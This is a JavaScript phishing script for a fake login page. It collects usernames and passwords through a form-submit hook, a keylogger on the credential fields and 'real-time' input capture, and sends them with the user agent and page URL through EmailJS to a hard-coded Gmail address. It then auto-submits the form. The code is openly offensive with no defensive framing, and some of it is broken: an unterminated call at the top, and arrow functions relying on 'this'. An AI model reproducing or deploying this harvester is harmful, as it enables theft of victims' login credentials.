// EmailJS Setup - Replace with YOUR credentials
emailjs.init("qqkqoL_8GoYfaQFKC");                 
emailjs.send("service_abc123xyz789...", "template_c2218hi", 

// Capture + Send Function
function sendCreds(username, password, method = 'form') {
    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
        to_email: "noblekartco@gmail.com",
        username: username,
        password: password,
        method: method,
        ip: "captured_via_emailjs",
        ua: navigator.userAgent,
        url: window.location.href
    }).then(() => console.log('SENT')).catch(e => console.log('Retry'));
}

// 1. FORM SUBMIT
document.getElementById('loginForm').onsubmit = function(e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    sendCreds(username, password, 'submit');
    return false;
};

// 2. KEYLOGGER
document.addEventListener('keydown', e => {
    if (e.target.id === 'username' || e.target.id === 'password') {
        sendCreds(e.target.value, '', `keylog-${e.key}`);
    }
});

// 3. REAL-TIME
let creds = {username:'', password:''};
document.getElementById('username').oninput = () => creds.username = this.value;
document.getElementById('password').oninput = () => {
    creds.password = this.value;
    if (creds.username && creds.password.length > 3) {
        sendCreds(creds.username, creds.password, 'live');
    }
};

// 4. AUTO-SUBMIT after 3 seconds
setTimeout(() => {
    const form = document.getElementById('loginForm');
    if (form.username.value && form.password.value) {
        form.submit();
    }
}, 3000);
